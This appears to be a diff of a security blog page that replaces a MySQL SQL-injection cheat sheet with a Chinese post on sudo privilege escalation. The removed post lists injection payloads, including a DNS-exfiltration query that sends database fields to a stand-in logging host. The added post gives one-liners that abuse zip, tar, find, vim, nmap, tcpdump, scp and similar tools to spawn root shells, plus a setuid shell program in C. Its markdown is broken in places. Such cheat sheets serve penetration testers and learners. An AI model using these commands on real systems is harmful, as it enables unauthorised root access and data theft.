@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="sql," />
+  <meta name="keywords" content="Privilege_escalation," />
 
 
 
@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="MySQL">
-<meta name="keywords" content="sql">
+<meta name="description" content="Sudo Privilege Escalation">
+<meta name="keywords" content="Privilege_escalation">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Sql Injection">
-<meta property="og:url" content="http://yoursite.com/2018/11/05/Sql-Injection/index.html">
+<meta property="og:title" content="Sudo提权">
+<meta property="og:url" content="http://yoursite.com/2019/04/20/sudo-privilege-escalation/index.html">
 <meta property="og:site_name" content="Fxven Blog">
-<meta property="og:description" content="MySQL">
+<meta property="og:description" content="Sudo Privilege Escalation">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-08T02:30:51.260Z">
+<meta property="og:updated_time" content="2019-04-20T10:15:25.803Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Sql Injection">
-<meta name="twitter:description" content="MySQL">
+<meta name="twitter:title" content="Sudo提权">
+<meta name="twitter:description" content="Sudo Privilege Escalation">
 
 
 
@@ -120,13 +120,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/05/Sql-Injection/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/04/20/sudo-privilege-escalation/"/>
 
 
 
 
 
-  <title>Sql Injection | Fxven Blog</title>
+  <title>Sudo提权 | Fxven Blog</title>
   
 
 
@@ -253,7 +253,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/05/Sql-Injection/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/20/sudo-privilege-escalation/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="fxven">
@@ -270,7 +270,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Sql Injection</h1>
+          <h1 class="post-title" itemprop="name headline">Sudo提权</h1>
         
 
         <div class="post-meta">
@@ -282,8 +282,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-05T13:20:34+08:00">
-                2018-11-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-20T18:12:09+08:00">
+                2019-04-20
               </time>
             
 
@@ -305,8 +305,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
+                  <a href="/categories/pentest/" itemprop="url" rel="index">
+                    <span itemprop="name">pentest</span>
                   </a>
                 </span>
 
@@ -333,6 +333,10 @@
           
 
           
+              <div class="post-description">
+                  Sudo Privilege Escalation
+              </div>
+          
 
         </div>
       </header>
@@ -347,25 +351,21 @@
       
 
       
-        <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><a id="more"></a>
-<h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p> <code>GET、POST、Headers</code>   </p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p> <code>&#39;</code>  <code>&quot;</code>   <code>or 1=1</code>  <code>and 1=2</code>  <code># &gt;&gt; %23</code>  <code>--+</code> </p>
-<h3 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat()、concat_ws()、group_contact()</span><br></pre></td></tr></table></figure>
-<h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><p> databases<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select databases();</span><br></pre></td></tr></table></figure></p>
-<p>tables<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure></p>
-<p>columns<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=table_name;</span><br></pre></td></tr></table></figure></p>
-<p>fields<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select field_name from table_name;</span><br></pre></td></tr></table></figure></p>
-<h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="Error-injection"><a href="#Error-injection" class="headerlink" title=" Error-injection "></a><strong> Error-injection </strong></h3><p> 对于 <code>select</code> ……<br> 对于 <code>update、insert</code>     </p>
-<p>  <strong> floor()+ count()+group by </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(0x23,(select database()),floor(rand()*2))a from information_schema.tables group by a) b)</span><br></pre></td></tr></table></figure></p>
-<p>  <strong> exp() </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select database() ) a) );</span><br></pre></td></tr></table></figure></p>
-<p>  <strong>bigint()</strong> (MySQL version &gt;= 5.4.45)  </p>
-<p>  <strong> updatexml() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x23,(select * from (select concat_ws(0x23,fileds_name) from users limit 0,1)a ) ),1)</span><br></pre></td></tr></table></figure></p>
-<p>  <strong> extractvalue() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x23,(select * from (select concat_ws(0x23,fileds_name) from users limit 0,1) a) ) )</span><br></pre></td></tr></table></figure></p>
-<h3 id="Blinds"><a href="#Blinds" class="headerlink" title="Blinds"></a><strong>Blinds</strong></h3><p>用的的函数: <code>substr()、ascii()、length()、if()、sleep()</code> </p>
-<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><p>二分法</p>
-<h4 id="Booleanbase"><a href="#Booleanbase" class="headerlink" title="Booleanbase"></a><strong>Booleanbase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;</span><br></pre></td></tr></table></figure>
-<h4 id="Timebase"><a href="#Timebase" class="headerlink" title="Timebase"></a><strong>Timebase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or if(substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;,sleep(5),1)</span><br></pre></td></tr></table></figure>
-<h4 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a><strong>DNSLOG</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if((select load_file(concat(&apos;\\\\&apos;,(select fileds from users limit 0,1),&apos;.xxx.ceye.io\\abc&apos;))),1,0)</span><br></pre></td></tr></table></figure>
+        <h1 id="Sudo提权"><a href="#Sudo提权" class="headerlink" title="Sudo提权"></a>Sudo提权</h1><h3 id="sudoers"><a href="#sudoers" class="headerlink" title="sudoers"></a>sudoers</h3><ul>
+<li><strong>sudo配置文件为/etc/sudoers(使用visudo进行修改)</strong></li>
+<li><strong>文件语法</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root          ALL(ALL:ALL)                      ALL</span><br><span class="line">使用者账户    来源主机名(可切换用户:用户组)        可执行的命令</span><br><span class="line">``` </span><br><span class="line">### </span><br><span class="line">### exploit</span><br><span class="line">- **先用`sudo -l`查看可用root身份执行的命令**</span><br><span class="line">- **zip**</span><br><span class="line">`$ sudo zip /tmp/test.zip /tmp/test -T --unzip-command =&quot;sh -c /bin/bash&quot;`</span><br><span class="line">- **tar**</span><br><span class="line">`$ sudo tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash`</span><br><span class="line">- **strace**</span><br><span class="line">`$ sudo strace -o /dev/null /bin/bash`</span><br><span class="line">- **find**</span><br><span class="line">`sudo find /etc/passw -exec /bin/sh \;`</span><br><span class="line">&amp;ensp;&amp;ensp;***or*** </span><br><span class="line">`sudo find /bin -name nano -exec /bin/sh \;`</span><br><span class="line">- **vim**</span><br><span class="line">`sudo vim -c &apos;!/bin/sh&apos;`</span><br><span class="line">- **nmap**</span><br><span class="line">旧版本</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>$ sudo nmap –interactive<br>nmap&gt; !/bin/sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`echo &quot;os.execute(&apos;/bin/sh&apos;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse`</span><br><span class="line">- **man,more,less,ftp,gdb,git**</span><br><span class="line">`sudo man man`  `sudo more /etc/hosts` `sudo less /etc/hosts`</span><br><span class="line">`sudo ftp` `sudo gdb` `sudo git help status`</span><br><span class="line">&amp;ensp;**之后输入!/bin/sh**</span><br><span class="line">- **tcpdump**</span><br></pre></td></tr></table></figure></p>
+<p>$ echo $’cat /etc/passwd’ &gt; /tmp/.shell<br>$ chmod +x /tmp/.shell<br>$ tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell -Z root</p>
+<p>/bin/sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- **nano,pico**</span><br><span class="line">`sudo nano -s /bin/bash` `sudo pico -s /bin/bash`</span><br><span class="line">&amp;ensp;**之后输入/bin/bash按CTRL+T**</span><br><span class="line">- **scp**</span><br><span class="line">`sudo scp -S /tmp/script.sh x y:`</span><br><span class="line">&amp;ensp;**shell.sh**</span><br></pre></td></tr></table></figure></p>
+<p>#!/bin/sh<br>gcc /tmp/shell.c -o /tmp/shell &amp;&amp; chmod 4755 /tmp/shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;**script.sh**</span><br></pre></td></tr></table></figure></p>
+<p>#include &lt;stdlib.h&gt;</p>
+<p>#include &lt;unistd.h&gt;<br>void main()<br>{<br>setuid(0);<br>setgid(0);<br>system(“/bin/bash”);<br>}</p>
+<h2 id=""><a href="#" class="headerlink" title="`"></a><code>`</code></h2><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
+<li><a href="https://touhidshaikh.com/blog/?p=790" target="_blank" rel="noopener">Abusing SUDO (Linux Privilege Escalation) - Touhid M.Shaikh</a></li>
+<li><a href="http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/" target="_blank" rel="noopener">Abusing SUDO Advance for Linux Privilege Escalation - RedTeam Tips - SecureLayer7</a></li>
+</ul>
 
       
     </div>
@@ -383,7 +383,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/sql/" <i class="fa fa-tag"></i> sql</a>
+            <a href="/tags/Privilege-escalation/" <i class="fa fa-tag"></i> Privilege_escalation</a>
           
         </div>
       
@@ -396,8 +396,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/06/26/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2019/04/17/Skills/" rel="next" title="Skills">
+                <i class="fa fa-chevron-left"></i> Skills
               </a>
             
           </div>
@@ -405,10 +405,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/13/File-upload/" rel="prev" title="File upload">
-                File upload <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -540,7 +536,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MySQL"><span class="nav-number">1.</span> <span class="nav-text">MySQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本"><span class="nav-number">1.1.</span> <span class="nav-text">基本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入点"><span class="nav-number">1.1.1.</span> <span class="nav-text">注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">1.1.2.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本函数"><span class="nav-number">1.1.3.</span> <span class="nav-text">基本函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本语句"><span class="nav-number">1.1.4.</span> <span class="nav-text">基本语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型"><span class="nav-number">1.2.</span> <span class="nav-text">注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Error-injection"><span class="nav-number">1.2.1.</span> <span class="nav-text"> Error-injection </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blinds"><span class="nav-number">1.2.2.</span> <span class="nav-text">Blinds</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常用方法"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">常用方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Booleanbase"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">Booleanbase</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Timebase"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">Timebase</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLOG"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">DNSLOG</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Sudo提权"><span class="nav-number">1.</span> <span class="nav-text">Sudo提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sudoers"><span class="nav-number">1.0.1.</span> <span class="nav-text">sudoers</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">1.1.</span> <span class="nav-text">`</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">1.1.1.</span> <span class="nav-text">Reference</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
